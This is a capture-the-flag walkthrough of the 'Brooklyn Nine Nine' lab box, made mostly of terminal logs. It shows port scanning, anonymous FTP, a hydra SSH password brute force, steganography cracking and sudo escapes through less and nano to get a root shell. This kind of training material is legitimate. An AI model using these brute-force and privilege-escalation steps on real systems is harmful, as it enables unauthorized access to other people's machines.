# nmap
```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.49.123
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 13:14 UTC
Nmap scan report for ip-10-10-49-123.eu-west-1.compute.internal (10.10.49.123)
Host is up (0.00095s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.133.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:C0:4C:B0:C0:AC (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds

```
# ftp
```
root@kali:~# ftp 10.10.49.123
Connected to 10.10.49.123.
220 (vsFTPd 3.0.3)
Name (10.10.49.123:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17 23:17 .
drwxr-xr-x    2 0        114          4096 May 17 23:17 ..
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17 23:17 .
drwxr-xr-x    2 0        114          4096 May 17 23:17 ..
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> mget note_to_jake.txt
mget note_to_jake.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (53.3322 kB/s)
ftp> exit
221 Goodbye.
root@kali:~# cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```
# hydra
```
root@kali:~# hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.49.123 ssh -v
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-26 13:32:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.49.123:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://jake@10.10.49.123:22
[INFO] Successful, password authentication is supported by ssh://10.10.49.123:22
[22][ssh] host: 10.10.49.123   login: jake   password: <pass>
[STATUS] attack finished for 10.10.49.123 (waiting for children to complete tests)
^C
```

# ssh
```
root@kali:~# ssh jake@10.10.49.123
jake@10.10.49.123's password:
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls -al
total 44
drwxr-xr-x 6 jake jake 4096 May 26 09:01 .
drwxr-xr-x 5 root root 4096 May 18 10:21 ..
-rw------- 1 root root 1349 May 26 09:01 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17 21:36 .cache
drwx------ 3 jake jake 4096 May 17 21:36 .gnupg
-rw------- 1 root root   67 May 26 09:01 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26 08:57 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18 14:29 .ssh
-rw-r--r-- 1 jake jake    0 May 17 21:36 .sudo_as_admin_successful
jake@brookly_nine_nine:~$
```

# sudo -l
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

# priv

```
jake@brookly_nine_nine:~$ sudo less /etc/profile
# whoami
root
# ls
# cd /root
# ls -al
total 32
drwx------  4 root root 4096 May 18 14:00 .
drwxr-xr-x 24 root root 4096 May 19 15:17 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 May 17 21:45 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 18 14:27 .ssh
-rw-r--r--  1 root root  165 May 17 23:19 .wget-hsts
-rw-r--r--  1 root root  135 May 18 14:00 root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <flag>

Enjoy!!
#
```

# user.txt
```
# find / -name "user.txt" -type f
/home/holt/user.txt
# cat /home/holt/user.txt
<flag>
#
```

# another pattern
## 80
```
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("brooklyn99.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
```



```
root@kali:~# stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: <pass>
Tried 20587 passwords
Your file has been written to: brooklyn99.jpg.out
```

```
root@kali:~# steghide extract -sf brooklyn99.jpg
Enter passphrase:
wrote extracted data to "note.txt".
root@kali:~# ls
brooklyn99.jpg      Desktop    Downloads  note_to_jake.txt  Pictures  results    thinclient_drives
brooklyn99.jpg.out  Documents  Music      note.txt          Public    Templates  Videos
root@kali:~# cat note
cat: note: No such file or directory
root@kali:~# cat note.txt
Holts Password:
<pass>

Enjoy!!
root@kali:~# ssh holt@10.10.49.123
holt@10.10.49.123's password:
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
```

```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
holt@brookly_nine_nine:~$
```
# priv
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
